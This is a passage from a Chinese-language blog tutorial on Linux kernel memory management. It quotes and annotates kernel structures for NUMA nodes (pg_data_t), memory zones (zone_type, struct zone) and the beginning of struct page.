class="keyword">struct</span> <span class="title">page</span> *<span class="title">node_mem_map</span>;</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifdef</span> CONFIG_PAGE_EXTENSION</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">page_ext</span> *<span class="title">node_page_ext</span>;</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">if</span> defined(CONFIG_MEMORY_HOTPLUG) || defined(CONFIG_DEFERRED_STRUCT_PAGE_INIT)</span></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * Must be held any time you expect node_start_pfn,</span></span><br><span class="line"><span class="comment"> * node_present_pages, node_spanned_pages or nr_zones to stay constant.</span></span><br><span class="line"><span class="comment"> * Also synchronizes pgdat-&gt;first_deferred_pfn during deferred page</span></span><br><span class="line"><span class="comment"> * init.</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * pgdat_resize_lock() and pgdat_resize_unlock() are provided to</span></span><br><span class="line"><span class="comment"> * manipulate node_size_lock without checking for CONFIG_MEMORY_HOTPLUG</span></span><br><span class="line"><span class="comment"> * or CONFIG_DEFERRED_STRUCT_PAGE_INIT.</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * Nests above zone-&gt;lock and zone-&gt;span_seqlock</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">spinlock_t</span> node_size_lock;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line">    <span class="comment">// 该节点的起始物理页面号</span></span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">long</span> node_start_pfn;</span><br><span class="line">    </span><br><span class="line">    <span class="comment">// 该节点中的总共页面数</span></span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">long</span> node_present_pages; <span class="comment">/* total number of physical pages */</span></span><br><span class="line">    </span><br><span class="line">    <span class="comment">// 该节点中的所有物理页面数，包括内存空洞(如部分地址为外设I/O使用)</span></span><br><span class="line">    <span class="comment">// 个人认为与上者的区别是这里包括了不能用的物理页</span></span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">long</span> node_spanned_pages; <span class="comment">/* total size of physical page</span></span><br><span class="line"><span class="comment">     range, including holes */</span></span><br><span class="line"><span class="comment">// 节点ID，从0开始</span></span><br><span class="line">    <span class="keyword">int</span> node_id;</span><br><span class="line"><span class="keyword">wait_queue_head_t</span> kswapd_wait;</span><br><span class="line"><span class="keyword">wait_queue_head_t</span> pfmemalloc_wait;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">task_struct</span> *<span class="title">kswapd</span>;</span><span class="comment">/* Protected by</span></span><br><span class="line"><span class="comment">   mem_hotplug_begin/end() */</span></span><br><span class="line"><span class="keyword">int</span> kswapd_order;</span><br><span class="line"><span class="class"><span class="keyword">enum</span> <span class="title">zone_type</span> <span class="title">kswapd_highest_zoneidx</span>;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">int</span> kswapd_failures;<span class="comment">/* Number of &#x27;reclaimed == 0&#x27; runs */</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifdef</span> CONFIG_COMPACTION</span></span><br><span class="line"><span class="keyword">int</span> kcompactd_max_order;</span><br><span class="line"><span class="class"><span class="keyword">enum</span> <span class="title">zone_type</span> <span class="title">kcompactd_highest_zoneidx</span>;</span></span><br><span class="line"><span class="keyword">wait_queue_head_t</span> kcompactd_wait;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">task_struct</span> *<span class="title">kcompactd</span>;</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * This is a per-node reserve of pages that are not available</span></span><br><span class="line"><span class="comment"> * to userspace allocations.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">long</span>totalreserve_pages;</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifdef</span> CONFIG_NUMA</span></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * node reclaim becomes active if more unmapped pages exist.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">long</span>min_unmapped_pages;</span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">long</span>min_slab_pages;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span> <span class="comment">/* CONFIG_NUMA */</span></span></span><br><span class="line"></span><br><span class="line"><span class="comment">/* Write-intensive fields used by page reclaim */</span></span><br><span class="line">ZONE_PADDING(_pad1_)</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifdef</span> CONFIG_DEFERRED_STRUCT_PAGE_INIT</span></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * If memory initialisation on large machines is deferred then this</span></span><br><span class="line"><span class="comment"> * is the first PFN that needs to be initialised.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">long</span> first_deferred_pfn;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span> <span class="comment">/* CONFIG_DEFERRED_STRUCT_PAGE_INIT */</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifdef</span> CONFIG_TRANSPARENT_HUGEPAGE</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">deferred_split</span> <span class="title">deferred_split_queue</span>;</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line"></span><br><span class="line"><span class="comment">/* Fields commonly accessed by the page reclaim scanner */</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * <span class="doctag">NOTE:</span> THIS IS UNUSED IF MEMCG IS ENABLED.</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * Use mem_cgroup_lruvec() to look up lruvecs.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">lruvec</span>__<span class="title">lruvec</span>;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">long</span>flags;</span><br><span class="line"></span><br><span class="line">ZONE_PADDING(_pad2_)</span><br><span class="line"></span><br><span class="line"><span class="comment">/* Per-node vmstats */</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">per_cpu_nodestat</span> __<span class="title">percpu</span> *<span class="title">per_cpu_nodestats</span>;</span></span><br><span class="line"><span class="keyword">atomic_long_t</span>vm_stat[NR_VM_NODE_STAT_ITEMS];</span><br><span class="line">&#125; <span class="keyword">pg_data_t</span>;</span><br></pre></td></tr></table></figure><p>当分配一个页面时，Linux使用本地节点分配策略，从运行的CPU最近的一个节点分配，因为进程倾向于在同一个CPU上运行，使用内存时也就更可能使用本节点的空间。</p><h3 id="区域（Zone）"><a href="#区域（Zone）" class="headerlink" title="区域（Zone）"></a>区域（Zone）</h3><h4 id="区域类型"><a href="#区域类型" class="headerlink" title="区域类型"></a>区域类型</h4><p>节点（Node）下面可以有多个区域，共有以下几种类型：</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">enum</span> <span class="title">zone_type</span> &#123;</span></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * ZONE_DMA and ZONE_DMA32 are used when there are peripherals not able</span></span><br><span class="line"><span class="comment"> * to DMA to all of the addressable memory (ZONE_NORMAL).</span></span><br><span class="line"><span class="comment"> * On architectures where this area covers the whole 32 bit address</span></span><br><span class="line"><span class="comment"> * space ZONE_DMA32 is used. ZONE_DMA is left for the ones with smaller</span></span><br><span class="line"><span class="comment"> * DMA addressing constraints. This distinction is important as a 32bit</span></span><br><span class="line"><span class="comment"> * DMA mask is assumed when ZONE_DMA32 is defined. Some 64-bit</span></span><br><span class="line"><span class="comment"> * platforms may need both zones as they support peripherals with</span></span><br><span class="line"><span class="comment"> * different DMA addressing limitations.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifdef</span> CONFIG_ZONE_DMA</span></span><br><span class="line">ZONE_DMA,</span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifdef</span> CONFIG_ZONE_DMA32</span></span><br><span class="line">ZONE_DMA32,</span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * Normal addressable memory is in ZONE_NORMAL. DMA operations can be</span></span><br><span class="line"><span class="comment"> * performed on pages in ZONE_NORMAL if the DMA devices support</span></span><br><span class="line"><span class="comment"> * transfers to all addressable memory.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line">ZONE_NORMAL,</span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifdef</span> CONFIG_HIGHMEM</span></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * A memory area that is only addressable by the kernel through</span></span><br><span class="line"><span class="comment"> * mapping portions into its own address space. This is for example</span></span><br><span class="line"><span class="comment"> * used by i386 to allow the kernel to address the memory beyond</span></span><br><span class="line"><span class="comment"> * 900MB. The kernel will set up special mappings (page</span></span><br><span class="line"><span class="comment"> * table entries on i386) for each page that the kernel needs to</span></span><br><span class="line"><span class="comment"> * access.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line">ZONE_HIGHMEM,</span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * ZONE_MOVABLE is similar to ZONE_NORMAL, except that it contains</span></span><br><span class="line"><span class="comment"> * movable pages with few exceptional cases described below. Main use</span></span><br><span class="line"><span class="comment"> * cases for ZONE_MOVABLE are to make memory offlining/unplug more</span></span><br><span class="line"><span class="comment"> * likely to succeed, and to locally limit unmovable allocations - e.g.,</span></span><br><span class="line"><span class="comment"> * to increase the number of THP/huge pages. Notable special cases are:</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * 1. Pinned pages: (long-term) pinning of movable pages might</span></span><br><span class="line"><span class="comment"> *    essentially turn such pages unmovable. Memory offlining might</span></span><br><span class="line"><span class="comment"> *    retry a long time.</span></span><br><span class="line"><span class="comment"> * 2. memblock allocations: kernelcore/movablecore setups might create</span></span><br><span class="line"><span class="comment"> *    situations where ZONE_MOVABLE contains unmovable allocations</span></span><br><span class="line"><span class="comment"> *    after boot. Memory offlining and allocations fail early.</span></span><br><span class="line"><span class="comment"> * 3. Memory holes: kernelcore/movablecore setups might create very rare</span></span><br><span class="line"><span class="comment"> *    situations where ZONE_MOVABLE contains memory holes after boot,</span></span><br><span class="line"><span class="comment"> *    for example, if we have sections that are only partially</span></span><br><span class="line"><span class="comment"> *    populated. Memory offlining and allocations fail early.</span></span><br><span class="line"><span class="comment"> * 4. PG_hwpoison pages: while poisoned pages can be skipped during</span></span><br><span class="line"><span class="comment"> *    memory offlining, such pages cannot be allocated.</span></span><br><span class="line"><span class="comment"> * 5. Unmovable PG_offline pages: in paravirtualized environments,</span></span><br><span class="line"><span class="comment"> *    hotplugged memory blocks might only partially be managed by the</span></span><br><span class="line"><span class="comment"> *    buddy (e.g., via XEN-balloon, Hyper-V balloon, virtio-mem). The</span></span><br><span class="line"><span class="comment"> *    parts not manged by the buddy are unmovable PG_offline pages. In</span></span><br><span class="line"><span class="comment"> *    some cases (virtio-mem), such pages can be skipped during</span></span><br><span class="line"><span class="comment"> *    memory offlining, however, cannot be moved/allocated. These</span></span><br><span class="line"><span class="comment"> *    techniques might use alloc_contig_range() to hide previously</span></span><br><span class="line"><span class="comment"> *    exposed pages from the buddy again (e.g., to implement some sort</span></span><br><span class="line"><span class="comment"> *    of memory unplug in virtio-mem).</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * In general, no unmovable allocations that degrade memory offlining</span></span><br><span class="line"><span class="comment"> * should end up in ZONE_MOVABLE. Allocators (like alloc_contig_range())</span></span><br><span class="line"><span class="comment"> * have to expect that migrating pages in ZONE_MOVABLE can fail (even</span></span><br><span class="line"><span class="comment"> * if has_unmovable_pages() states that there are no unmovable pages,</span></span><br><span class="line"><span class="comment"> * there can be false negatives).</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line">ZONE_MOVABLE,</span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifdef</span> CONFIG_ZONE_DEVICE</span></span><br><span class="line">ZONE_DEVICE,</span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line">__MAX_NR_ZONES</span><br><span class="line"></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p><strong>ZONE_DMA</strong></p><p>是低内存的一块区域，这块区域由标准工业架构设备使用，适合DMA内存。这部分内存大小和CPU架构有关，在x86架构中，该部分区域大小限制为16MB。</p><p><strong>ZONE_DMA32</strong></p><p>该部分区域为适合支持32位地址总线的DMA内存空间。很显然，该部分仅在64位系统有效，在32位系统中，这部分区域为空。在x86-64架构中，这部分的区域范围为0~4GB。</p><p><strong>ZONE_NORMAL</strong></p><p>属于<code>ZONE_NORMAL</code>的内存被内核直接映射到线性地址。这部分区域仅表示可能存在这部分区域，如在64位系统中，若系统只有4GB物理内存，则所有的物理内存都属于<code>ZONE_DMA32</code>，而<code>ZONE_NORMAL</code>区域为空。</p><p>许多内核操作都仅在<code>ZONE_NORMAL</code>内存区域进行，所以这部分是系统性能关键的地方。</p><p><strong>ZONE_HIGHMEM</strong></p><p>是系统中剩下的可用内存，但因为内核的地址空间有限，这部分内存不直接映射到内核。</p><p>在x86架构中内存有三种区域：<code>ZONE_DMA</code>,<code>ZONE_NORMAL</code>,<code>ZONE_HIGHMEM</code>。不同类型的区域适合不同需要。在32位系统结构中，1G(内核空间) / 3G(内核空间)地址空间划分时，三种类型的区域如下：</p><ul><li><strong>ZONE_DMA</strong>：内存开始的16MB</li><li><strong>ZONE_NORMAL</strong>：16MB~896MB</li><li><strong>ZONE_HIGHMEM</strong>：896~结束</li></ul><p>4G(内核空间) / 4G(用户空间)地址空间划分时，三种类型区域划分为：</p><ul><li><strong>ZONE_DMA</strong>：内存开始的16MB</li><li><strong>ZONE_NORMAL</strong>：16MB~3968MB</li><li><strong>ZONE_HIGHMEM</strong>：3968MB~结束</li></ul><p>对于64位系统中，不存在高端内存，这里个人的理解是64位系统中，线性地址能达到2^64B这么多，就算是物理地址一一对应来映射，也能够访问到所有的物理地址。之所以出现高端内存是因为我们的虚拟地址不足以映射所有的物理地址，此时如果一一映射，那么我们就没法访问到所有的物理内存。下图为32为和64位系统中内存区域划分区别</p><p><img src="https://inews.gtimg.com/newsapp_ls/0/13417851569/0" alt="image-20210416155935255"></p><h4 id="struct-zone结构体"><a href="#struct-zone结构体" class="headerlink" title="struct zone结构体"></a>struct zone结构体</h4><p>每块区域的描述结构为<code>struct zone</code>。<code>zone</code>跟踪一些信息，如页面的使用统计、空闲页面及锁等，数据结构定义在文件<code>include/linux/mmzone.h</code>中。</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">zone</span> &#123;</span></span><br><span class="line"><span class="comment">/* Read-mostly fields */</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/* zone watermarks, access with *_wmark_pages(zone) macros */</span></span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">long</span> _watermark[NR_WMARK];</span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">long</span> watermark_boost;</span><br><span class="line"></span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">long</span> nr_reserved_highatomic;</span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * We don&#x27;t know if the memory that we&#x27;re going to allocate will be</span></span><br><span class="line"><span class="comment"> * freeable or/and it will be released eventually, so to avoid totally</span></span><br><span class="line"><span class="comment"> * wasting several GB of ram we must reserve some of the lower zone</span></span><br><span class="line"><span class="comment"> * memory (otherwise we risk to run OOM on the lower zones despite</span></span><br><span class="line"><span class="comment"> * there being tons of freeable ram on the higher zones).  This array is</span></span><br><span class="line"><span class="comment"> * recalculated at runtime if the sysctl_lowmem_reserve_ratio sysctl</span></span><br><span class="line"><span class="comment"> * changes.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line">    <span class="comment">// 针对每个区域保存的物理页面数量，保证在任何条件下，申请内存都不会失败</span></span><br><span class="line"><span class="keyword">long</span> lowmem_reserve[MAX_NR_ZONES];</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifdef</span> CONFIG_NUMA</span></span><br><span class="line"><span class="keyword">int</span> node;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line">    <span class="comment">// 指向父亲pg_data_t</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">pglist_data</span>*<span class="title">zone_pgdat</span>;</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">per_cpu_pageset</span> __<span class="title">percpu</span> *<span class="title">pageset</span>;</span></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * the high and batch values are copied to individual pagesets for</span></span><br><span class="line"><span class="comment"> * faster access</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">int</span> pageset_high;</span><br><span class="line"><span class="keyword">int</span> pageset_batch;</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifndef</span> CONFIG_SPARSEMEM</span></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * Flags for a pageblock_nr_pages block. See pageblock-flags.h.</span></span><br><span class="line"><span class="comment"> * In SPARSEMEM, this map is stored in struct mem_section</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">long</span>*pageblock_flags;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span> <span class="comment">/* CONFIG_SPARSEMEM */</span></span></span><br><span class="line"></span><br><span class="line"><span class="comment">/* zone_start_pfn == zone_start_paddr &gt;&gt; PAGE_SHIFT */</span></span><br><span class="line">    <span class="comment">// 该区域节点的物理页面号</span></span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">long</span>zone_start_pfn;</span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * spanned_pages is the total pages spanned by the zone, including</span></span><br><span class="line"><span class="comment"> * holes, which is calculated as:</span></span><br><span class="line"><span class="comment"> * spanned_pages = zone_end_pfn - zone_start_pfn;</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * present_pages is physical pages existing within the zone, which</span></span><br><span class="line"><span class="comment"> * is calculated as:</span></span><br><span class="line"><span class="comment"> *present_pages = spanned_pages - absent_pages(pages in holes);</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * managed_pages is present pages managed by the buddy system, which</span></span><br><span class="line"><span class="comment"> * is calculated as (reserved_pages includes pages allocated by the</span></span><br><span class="line"><span class="comment"> * bootmem allocator):</span></span><br><span class="line"><span class="comment"> *managed_pages = present_pages - reserved_pages;</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * cma pages is present pages that are assigned for CMA use</span></span><br><span class="line"><span class="comment"> * (MIGRATE_CMA).</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * So present_pages may be used by memory hotplug or memory power</span></span><br><span class="line"><span class="comment"> * management logic to figure out unmanaged pages by checking</span></span><br><span class="line"><span class="comment"> * (present_pages - managed_pages). And managed_pages should be used</span></span><br><span class="line"><span class="comment"> * by page allocator and vm scanner to calculate all kinds of watermarks</span></span><br><span class="line"><span class="comment"> * and thresholds.</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * Locking rules:</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * zone_start_pfn and spanned_pages are protected by span_seqlock.</span></span><br><span class="line"><span class="comment"> * It is a seqlock because it has to be read outside of zone-&gt;lock,</span></span><br><span class="line"><span class="comment"> * and it is done in the main allocator path.  But, it is written</span></span><br><span class="line"><span class="comment"> * quite infrequently.</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * The span_seq lock is declared along with zone-&gt;lock because it is</span></span><br><span class="line"><span class="comment"> * frequently read in proximity to zone-&gt;lock.  It&#x27;s good to</span></span><br><span class="line"><span class="comment"> * give them a chance of being in the same cacheline.</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * Write access to present_pages at runtime should be protected by</span></span><br><span class="line"><span class="comment"> * mem_hotplug_begin/end(). Any reader who can&#x27;t tolerant drift of</span></span><br><span class="line"><span class="comment"> * present_pages should get_online_mems() to get a stable value.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">atomic_long_t</span>managed_pages;</span><br><span class="line">    <span class="comment">// 所有物理页面数，包括内存空洞</span></span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">long</span>spanned_pages;</span><br><span class="line">    <span class="comment">// 总共页面数，不包括内存空洞</span></span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">long</span>present_pages;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifdef</span> CONFIG_CMA</span></span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">long</span>cma_pages;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line"><span class="comment">// 区域的名字 &quot;DMA&quot;,&quot;DMA32&quot;,&quot;NORMAL&quot;,&quot;HIGHMEM&quot;</span></span><br><span class="line"><span class="keyword">const</span> <span class="keyword">char</span>*name;</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifdef</span> CONFIG_MEMORY_ISOLATION</span></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * Number of isolated pageblock. It is used to solve incorrect</span></span><br><span class="line"><span class="comment"> * freepage counting problem due to racy retrieving migratetype</span></span><br><span class="line"><span class="comment"> * of pageblock. Protected by zone-&gt;lock.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">long</span>nr_isolate_pageblock;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifdef</span> CONFIG_MEMORY_HOTPLUG</span></span><br><span class="line"><span class="comment">/* see spanned/present_pages for more description */</span></span><br><span class="line"><span class="keyword">seqlock_t</span>span_seqlock;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">int</span> initialized;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* Write-intensive fields used from the page allocator */</span></span><br><span class="line">ZONE_PADDING(_pad1_)</span><br><span class="line"></span><br><span class="line"><span class="comment">/* free areas of different sizes */</span></span><br><span class="line">    <span class="comment">// buddy分配器使用的空闲区域位图</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">free_area</span><span class="title">free_area</span>[<span class="title">MAX_ORDER</span>];</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/* zone flags, see below */</span></span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">long</span>flags;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* Primarily protects free_area */</span></span><br><span class="line">    <span class="comment">// spinlock防止对区域的并发访问</span></span><br><span class="line"><span class="keyword">spinlock_t</span>lock;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* Write-intensive fields used by compaction and vmstats. */</span></span><br><span class="line">ZONE_PADDING(_pad2_)</span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * When free pages are below this point, additional steps are taken</span></span><br><span class="line"><span class="comment"> * when reading the number of free pages to avoid per-cpu counter</span></span><br><span class="line"><span class="comment"> * drift allowing watermarks to be breached</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">long</span> percpu_drift_mark;</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">if</span> defined CONFIG_COMPACTION || defined CONFIG_CMA</span></span><br><span class="line"><span class="comment">/* pfn where compaction free scanner should start */</span></span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">long</span>compact_cached_free_pfn;</span><br><span class="line"><span class="comment">/* pfn where compaction migration scanner should start */</span></span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">long</span>compact_cached_migrate_pfn[ASYNC_AND_SYNC];</span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">long</span>compact_init_migrate_pfn;</span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">long</span>compact_init_free_pfn;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifdef</span> CONFIG_COMPACTION</span></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * On compaction failure, 1&lt;&lt;compact_defer_shift compactions</span></span><br><span class="line"><span class="comment"> * are skipped before trying again. The number attempted since</span></span><br><span class="line"><span class="comment"> * last failure is tracked with compact_considered.</span></span><br><span class="line"><span class="comment"> * compact_order_failed is the minimum compaction failed order.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">int</span>compact_considered;</span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">int</span>compact_defer_shift;</span><br><span class="line"><span class="keyword">int</span>compact_order_failed;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">if</span> defined CONFIG_COMPACTION || defined CONFIG_CMA</span></span><br><span class="line"><span class="comment">/* Set to true when the PG_migrate_skip bits should be cleared */</span></span><br><span class="line"><span class="keyword">bool</span>compact_blockskip_flush;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">bool</span>contiguous;</span><br><span class="line"></span><br><span class="line">ZONE_PADDING(_pad3_)</span><br><span class="line"><span class="comment">/* Zone statistics */</span></span><br><span class="line"><span class="keyword">atomic_long_t</span>vm_stat[NR_VM_ZONE_STAT_ITEMS];</span><br><span class="line"><span class="keyword">atomic_long_t</span>vm_numa_stat[NR_VM_NUMA_STAT_ITEMS];</span><br><span class="line">&#125; ____cacheline_internodealigned_in_smp;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">enum</span> <span class="title">pgdat_flags</span> &#123;</span></span><br><span class="line">PGDAT_DIRTY,<span class="comment">/* reclaim scanning has recently found</span></span><br><span class="line"><span class="comment"> * many dirty file pages at the tail</span></span><br><span class="line"><span class="comment"> * of the LRU.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line">PGDAT_WRITEBACK,<span class="comment">/* reclaim scanning has recently found</span></span><br><span class="line"><span class="comment"> * many pages under writeback</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line">PGDAT_RECLAIM_LOCKED,<span class="comment">/* prevents concurrent reclaim */</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><h3 id="页面（Page）"><a href="#页面（Page）" class="headerlink" title="页面（Page）"></a>页面（Page）</h3><p>系统内存由固定的块组成，称为页帧（页框），每个页帧由<code>struct page</code>结构描述。内核在初始化时，会根据内存的大小计算出有多少页帧，每个页帧都会有一个page结构与之对应，这些信息保存在全局数组变量mem_map中。mem_map通常存储在<code>ZONE_NORMAL</code>区域中，在内存较小的机器中，会保存在加载内核镜像后的一片保留空间里。有多少个物理页面，就会有多个<code>struct page</code>结构。</p><h4 id="struct-page结构体"><a href="#struct-page结构体" class="headerlink" title="struct page结构体"></a>struct page结构体</h4><p><code>struct page</code>数据结构定义在文件<code>include/linux/mm_types.h</code>中</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">page</span> &#123;</span></span><br><span class="line">    <span class="comment">// 描述页面状态的标志。所有的标志在include/linux/page-flags.h中定义，</span></span><br><span class="line">    <span class="comment">// 主要标志包括PG_locked、PG_error、PG_referenced、PG_uptodate、</span></span><br><span class="line">    <span class="comment">// PG_active、PG_dirty、PG_lru等。</span></span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">long</span> flags;<span class="comment">/* Atomic flags, some possibly</span></span><br><span class="line"><span class="comment"> * updated asynchronously */</span></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * Five words (20/40 bytes) are available in this union.</span></span><br><span class="line"><span class="comment"> * WARNING: bit 0 of the first word is used for PageTail(). That</span></span><br><span class="line"><span class="comment"> * means the other users of this union MUST NOT use the bit to</span></span><br><span class="line"><span class="comment"> * avoid collision and false-positive PageTail().</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="class"><span class="keyword">union</span> &#123;</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> &#123;</span><span class="comment">/* Page cache and anonymous pages */</span></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * @lru: Pageout list, eg. active_list protected 